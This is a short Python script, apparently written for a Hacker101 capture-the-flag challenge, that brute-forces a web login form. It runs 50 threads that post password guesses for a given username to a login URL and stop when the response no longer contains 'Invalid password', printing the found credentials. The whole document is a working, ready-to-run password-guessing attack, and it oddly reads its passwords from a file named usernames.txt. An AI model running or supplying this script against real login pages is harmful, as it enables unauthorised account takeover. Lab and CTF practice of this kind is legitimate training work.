import requests
import threading
import os
import sys
from collections import deque

thread_count = 50

def check_username(username, q, url):
    while q:
        password = q.popleft()
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "Invalid password" not in response.text:  # Response text can be different, check the response and change before running the script (after finding correct username).
            print(f"Username: {username}, Password: {password}")
            print(response.text)
            os._exit(1)
        else:
            print(f"Incorrect password: {password}")

            
username = sys.argv[1]
url = "https://ID.ctf.hacker101.com/login" # Change to your URL
# Username and password will be different for each person. This list might not work for everyone.
username_file = open("lists/usernames.txt", "r")
q = deque()
for name in username_file.readlines():
    q.append(name.strip())

for i in range(thread_count):
    threading.Thread(target=check_username, args=(username, q, url)).start()

